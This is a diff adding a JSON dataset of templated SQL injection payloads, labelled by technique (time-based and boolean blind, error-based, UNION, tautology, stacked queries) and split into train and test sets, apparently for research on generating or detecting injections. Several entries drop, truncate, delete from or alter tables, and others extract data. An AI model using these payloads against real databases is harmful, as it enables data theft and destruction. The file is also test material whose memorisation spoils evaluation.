+        "payload": "' AND (SELECT SLEEP(5) WHERE 1.9 > 1.54)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND CASE WHEN 'sla' = 'sla' THEN SLEEP(5) ELSE 0 END",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND EXISTS(SELECT SLEEP(5))",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND BENCHMARK(500000,MD5('example'))",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND CAST(($sysInfo$) AS UNSIGNED)=$int$",
+        "expected_types": [
+            "string",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND CAST(($sysInfo$) AS DECIMAL)=$float$",
+        "expected_types": [
+            "string",
+            "float"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND CAST(($sysInfo$) AS BINARY)=$hex$",
+        "expected_types": [
+            "string",
+            "hex"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND ($sysInfo$)=$int$",
+        "expected_types": [
+            "string",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND ($sysInfo$)>$int$",
+        "expected_types": [
+            "string",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND ($sysInfo$) BETWEEN $int$ AND $int$",
+        "expected_types": [
+            "string",
+            "integer",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND SQRT($sysInfo$)",
+        "expected_types": [
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND MOD($int$, $sysInfo$)",
+        "expected_types": [
+            "integer",
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND SUBSTR($sysInfo$, $int$, $int$)=$character$",
+        "expected_types": [
+            "integer",
+            "integer",
+            "integer",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND SUBSTR($int$, $int$, $sysInfo$)=$character$",
+        "expected_types": [
+            "integer",
+            "integer",
+            "integer",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND TIME($sysInfo$)=$time$",
+        "expected_types": [
+            "string",
+            "time"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND DATE($sysInfo$)=$date$",
+        "expected_types": [
+            "string",
+            "date"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND TO_DAYS($sysInfo$)=$int$",
+        "expected_types": [
+            "integer",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND extractvalue(1,concat($hex$,($sysInfo$),$hex$))",
+        "expected_types": [
+            "hex",
+            "integer",
+            "hex"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND updatexml(1,concat($hex$,($sysInfo$),$hex$),1)",
+        "expected_types": [
+            "hex",
+            "integer",
+            "hex"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND GTID_SUBSET(($sysInfo$),$character$)=1",
+        "expected_types": [
+            "integer",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND GTID_SUBTRACT(($sysInfo$),$character$)=1",
+        "expected_types": [
+            "integer",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION $sysInfo$",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION ALL $sysInfo$",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ($sysInfo$)=$sample$",
+        "expected_types": [
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ($sysInfo$)>0",
+        "expected_types": [
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LENGTH($sysInfo$)>0",
+        "expected_types": [
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ($sysInfo$) IS NOT NULL",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR EXISTS($sysInfo$)",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ($sysInfo$) LIKE $sample$",
+        "expected_types": [
+            "string",
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ($sysInfo$) REGEXP '[a-z]'",
+        "expected_types": [
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR NOT ISNULL($sysInfo$)",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR COALESCE($sysInfo$)",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR ($sysInfo$)=($sysInfo$)",
+        "expected_types": [
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR CASE WHEN ($sysInfo$)=$sample$ THEN 1 ELSE 0 END=1",
+        "expected_types": [
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR SUBSTRING($sysInfo$,1,1)=$character$",
+        "expected_types": [
+            "string",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LEFT($sysInfo$,1)=$character$",
+        "expected_types": [
+            "string",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; SELECT $column_t1_1$ FROM $table_1$;",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; DELETE FROM $table_1$ WHERE $column_t1_1$=$sample_t1_1$;",
+        "expected_types": [
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; DELETE FROM $table_1$ WHERE $sysInfo$ IS NOT NULL;",
+        "expected_types": [
+            "table",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; TRUNCATE TABLE $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; DROP TABLE IF EXISTS $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$=$sample_t1_2$;",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; INSERT INTO temp_table SELECT * FROM $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; INSERT INTO temp_table SELECT $column_t1_1$ FROM $table_1$ where $column_t1_2$=$sample_t1_2$;",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; CREATE TABLE temp_data AS SELECT * FROM $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; CREATE TABLE temp_data AS SELECT $column_t1_1$ FROM $table_1$ where $column_t1_2$=$sample_t1_2$;",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; UPDATE $table_1$ SET $column_t1_1$=$int$ WHERE $column_t1_2$=$sample_t1_2$;",
+        "expected_types": [
+            "table",
+            "number",
+            "integer",
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND ($sysInfo$)=$sample$",
+        "expected_types": [
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND ($sysInfo$)>$int$",
+        "expected_types": [
+            "integer",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND LENGTH($sysInfo$)>$int$",
+        "expected_types": [
+            "string",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND ($sysInfo$) LIKE $character$",
+        "expected_types": [
+            "string",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND ($sysInfo$) REGEXP '[0-9]'",
+        "expected_types": [
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND RIGHT($sysInfo$,1)=$character$",
+        "expected_types": [
+            "string",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND SUBSTR($sysInfo$, 1, 1) > $character$",
+        "expected_types": [
+            "string",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND SUBSTR($sysInfo$, 1 ,1) IN ('a','e','i','o','u')",
+        "expected_types": [
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND ASCII(SUBSTR($sysInfo$, 1, 1))=$int$",
+        "expected_types": [
+            "string",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND CASE WHEN ($sysInfo$)=$sample$ THEN 1 ELSE 0 END=1",
+        "expected_types": [
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND IF(($sysInfo$)>$int$,1,0)=1",
+        "expected_types": [
+            "integer",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND SELECT SLEEP($int$) WHERE ($sysInfo$)=$sample$",
+        "expected_types": [
+            "integer",
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND SELECT SLEEP($int$) WHERE ($sysInfo$)>0",
+        "expected_types": [
+            "integer",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND SELECT SLEEP($int$) WHERE ($sysInfo$) LIKE $character$",
+        "expected_types": [
+            "integer",
+            "string",
+            "character"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND IF((SELECT SUBSTRING($sysInfo$,$int$,1))=$character$,SLEEP($int$),0)",
+        "expected_types": [
+            "string",
+            "integer",
+            "character",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND CASE WHEN ($sysInfo$)=$sample$ THEN SLEEP(5) ELSE 0 END",
+        "expected_types": [
+            "all",
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND CASE WHEN ($sysInfo$) REGEXP '[a-z]' THEN SLEEP(5) ELSE 0 END",
+        "expected_types": [
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR($sysInfo$,1,1) IN ('a','e','i','o','u')",
+        "expected_types": [
+            "string"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)>$int$",
+        "expected_types": [
+            "table",
+            "table",
+            "table",
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND CAST((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) AS DECIMAL) = $float$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "float"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $int$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>$int$",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND SQRT(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND TIME(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $time$",
+        "expected_types": [
+            "number",
+            "table",
+            "all",
+            "all",
+            "time"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND TO_DAYS(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)=$int$",
+        "expected_types": [
+            "number",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND extractvalue(1,concat($hex$,(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$hex$))",
+        "expected_types": [
+            "hex",
+            "all",
+            "table",
+            "all",
+            "all",
+            "hex"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND GTID_SUBSET((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$int$) = 1",
+        "expected_types": [
+            "number",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT $column_t1_1$ FROM $table_1$",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION ALL SELECT $column_t1_1$ FROM $table_1$",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION ALL SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$",
+        "expected_types": [
+            "all",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>0",
+        "expected_types": [
+            "number",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LENGTH(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>0",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) IS NOT NULL",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR EXISTS(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $sample_t2_1$",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all",
+            "string"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) REGEXP '[a-z]'",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR NOT ISNULL(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "all",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR COALESCE(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)=(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "number",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all",
+            "number",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR CASE WHEN (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$ THEN 1 ELSE 0 END=1",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) = $character$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "character"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "tautology",
+        "payload": "' OR LEFT(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1) = $character$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "character"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; SELECT $column_t1_1$ FROM $table_1$;",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; DELETE FROM $table_1$ WHERE $column_t1_1$ = $sample_t1_1$;",
+        "expected_types": [
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; DELETE FROM $table_1$ WHERE $sysInfo$ IS NOT NULL;",
+        "expected_types": [
+            "table",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; TRUNCATE TABLE $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; DROP TABLE IF EXISTS $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$;",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; INSERT INTO temp_table SELECT * FROM $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; INSERT INTO temp_table SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$;",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; CREATE TABLE temp_data AS SELECT * FROM $table_1$;",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; CREATE TABLE temp_data AS SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$;",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "piggy_backed",
+        "payload": "'; UPDATE $table_1$ SET $column_t1_1$ = $int$ WHERE $column_t1_2$ = $sample_t1_2$;",
+        "expected_types": [
+            "table",
+            "number",
+            "integer",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND LENGTH(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$)>$int$",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) LIKE $character$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "character"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) REGEXP '[0-9]'",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND RIGHT(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1) = $character$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "character"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND SUBSTR(SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$, 1, 1) > $character$",
+        "expected_types": [
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all",
+            "character"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$, 1 ,1) IN ('a','e','i','o','u')",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND ASCII(SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$, 1, 1)) = $int$",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
